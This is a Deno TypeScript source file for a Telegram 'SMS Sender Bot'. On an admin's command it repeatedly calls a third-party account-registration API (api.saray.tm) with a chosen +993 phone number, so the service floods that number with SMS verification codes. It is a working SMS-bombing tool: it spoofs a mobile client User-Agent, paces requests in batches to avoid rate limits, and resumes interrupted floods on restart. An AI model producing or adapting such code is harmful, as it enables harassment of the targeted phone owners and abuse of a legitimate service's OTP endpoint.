// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// 🧠 Uses Deno KV for persistent state (never stops working)
// ✨ /stop halts all tasks instantly, even during waits

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- 🔐 Telegram setup ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- 👑 Admin username ---
const ADMIN_USERNAME = "Masakoff";

// --- 💾 Deno KV ---
const kv = await Deno.openKv();

// --- 💬 Send message helper ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, ...options }),
    });
  } catch (e) {
    console.error("sendMessage error ❌", e);
  }
}

// --- 🌐 POST request helper ---
async function sendPostRequest(
  url: string,
  headers: Record<string, string>,
  data: Record<string, any>
): Promise<boolean> {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(data),
    });
    return res.ok;
  } catch (e) {
    console.error("POST request failed ❌", e);
    return false;
  }
}

// --- 🔁 Interruptible sleep ---
async function sleepInterruptible(totalMs: number, chatId: string, chunkMs = 500): Promise<boolean> {
  const start = Date.now();
  while (Date.now() - start < totalMs) {
    const task = await kv.get(["task", chatId]);
    if (!task.value || task.value.stop) return false;
    await delay(Math.min(chunkMs, totalMs - (Date.now() - start)));
  }
  return true;
}

// --- 💣 SMS sending job ---
async function runSMS(chatId: string, phoneNumber: string, maxCount: number) {
  const key = ["task", chatId];
  await kv.set(key, { phoneNumber, stop: false, count: 0, maxCount });

  const requestData = {
    url: "https://api.saray.tm/api/v1/accounts",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json; charset=utf-8",
      "Host": "api.saray.tm",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "User-Agent": "okhttp/4.12.0",
    },
    data: { phone: `+993${phoneNumber}` },
  };

  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);

  try {
    while (true) {
      const task = await kv.get(key);
      if (!task.value || task.value.stop || task.value.count >= task.value.maxCount) break;

      // Send batch of 3 SMS
      for (let i = 0; i < 3; i++) {
        const check = await kv.get(key);
        if (!check.value || check.value.stop || check.value.count >= check.value.maxCount) break;

        const newCount = (check.value.count ?? 0) + 1;
        await kv.set(key, { ...check.value, count: newCount });

        await sendMessage(chatId, `📤 Sending SMS #${newCount} to +993${phoneNumber}...`);

        const ok = await sendPostRequest(requestData.url, requestData.headers, requestData.data);
        if (ok) {
          await sendMessage(chatId, "✅ Sent successfully!");
        } else {
          await sendMessage(chatId, "❌ Failed to send SMS. Retrying...");
        }

        const sleepOk = await sleepInterruptible(5000, chatId);
        if (!sleepOk) break;
      }

      const batchCheck = await kv.get(key);
      if (!batchCheck.value || batchCheck.value.stop || batchCheck.value.count >= batchCheck.value.maxCount) break;

      await sendMessage(chatId, "⏳ Batch of 3 SMS done. Waiting 45 seconds before next batch...");
      const waitOk = await sleepInterruptible(45000, chatId);
      if (!waitOk) break;
    }
  } catch (e) {
    console.error("SMS task error ❌", e);
  } finally {
    await kv.delete(key);
    await sendMessage(chatId, "⏹ SMS sending stopped or finished. 🎉");
  }
}

// --- 🖥️ Webhook Server ---
serve(async (req) => {
  const url = new URL(req.url);
  if (req.method !== "POST" || url.pathname !== SECRET_PATH) return new Response("Invalid request ❌", { status: 400 });

  const update = await req.json();
  if (!update.message || update.message.chat.type !== "private") return new Response("OK");

  const chatId = String(update.message.chat.id);
  const text = (update.message.text ?? "").trim();
  const username = update.message.from?.username ?? "";

  if (username !== ADMIN_USERNAME) {
    await sendMessage(chatId, "🚫 Access denied! This bot is for @Masakoff only 👑");
    return new Response("OK");
  }

  // --- Commands ---
  if (text.startsWith("/start")) {
    await sendMessage(chatId,
      "👋 Welcome to 💥 Masakoff SMS Sender Bot 💥\n\n" +
      "📲 Commands:\n" +
      "• /send <number> — start sending SMS\n" +
      "• /stop — stop all sending ⛔\n\n" +
      "✨ Created by @Masakoff"
    );

  } else if (text.startsWith("/send")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /send 61234567");
      return new Response("OK");
    }

    const phoneNumber = parts[1].replace(/^\+993/, "");
    const existing = await kv.get(["task", chatId]);
    if (existing.value && !existing.value.stop) {
      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
      return new Response("OK");
    }

    // Ask how many SMS to send
    await sendMessage(chatId, "❓ How many SMS requests should be sent?");
    // Store temporary waiting state
    await kv.set(["awaitingCount", chatId], { phoneNumber });

  } else if (/^\d+$/.test(text)) {
    // If admin sent a number while waiting for SMS count
    const waiting = await kv.get(["awaitingCount", chatId]);
    if (waiting.value) {
      const count = parseInt(text);
      await kv.delete(["awaitingCount", chatId]);
      runSMS(chatId, waiting.value.phoneNumber, count).catch(console.error);
      await sendMessage(chatId, `🚀 SMS sending started for +993${waiting.value.phoneNumber} (max ${count} SMS)`);
    }

  } else if (text.startsWith("/stop")) {
    const task = await kv.get(["task", chatId]);
    if (!task.value) {
      await sendMessage(chatId, "ℹ️ No active SMS task to stop.");
    } else {
      await kv.set(["task", chatId], { ...task.value, stop: true });
      await sendMessage(chatId, "🛑 Stop signal sent! Tasks will halt instantly.");
    }

  } else {
    await sendMessage(chatId, "❓ Unknown command. Try /start, /send <number>, or /stop.");
  }

  return new Response("OK");
});

// --- ♻️ Auto-recover unfinished tasks on startup ---
(async () => {
  console.log("🔄 Checking for unfinished tasks...");
  for await (const entry of kv.list<{ phoneNumber: string; stop: boolean; maxCount?: number }>({ prefix: ["task"] })) {
    if (entry.value && !entry.value.stop) {
      console.log(`Resuming task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
      runSMS(entry.key[1] as string, entry.value.phoneNumber, entry.value.maxCount ?? Infinity).catch(console.error);
    }
  }
})();

